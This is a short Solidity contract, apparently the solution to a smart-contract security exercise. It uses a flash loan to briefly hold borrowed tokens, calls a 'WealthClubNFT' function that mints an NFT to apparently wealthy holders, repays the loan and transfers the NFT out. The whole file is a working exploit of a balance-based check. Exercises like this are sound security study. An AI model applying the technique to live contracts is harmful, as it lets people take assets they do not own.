pragma solidity ^0.8.18;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// the goal is to get NFT by flash loan mechnism
interface IWealthClubNFT {
    function iDeclareBeingRich() external;
}

contract FlashLoanExecutor is Ownable {
    address public bankToken;
    address public wealthClubNFT;

    constructor(address _bankToken, address _wealthClubNFT) {
        bankToken = _bankToken;
        wealthClubNFT = _wealthClubNFT;
    }

    function executeWithMoney(uint256 amount) external {
        IWealthClubNFT(wealthClubNFT).iDeclareBeingRich(); // mint a new NFT
        IERC20(bankToken).transfer(msg.sender, amount); // return the bankToken loan
    }

    function transferNFT(address to, uint256 tokenID) external onlyOwner {
        IERC721(wealthClubNFT).approve(to, tokenID);
        IERC721(wealthClubNFT).transferFrom(address(this), to, tokenID); // transfer the NFT
    }
}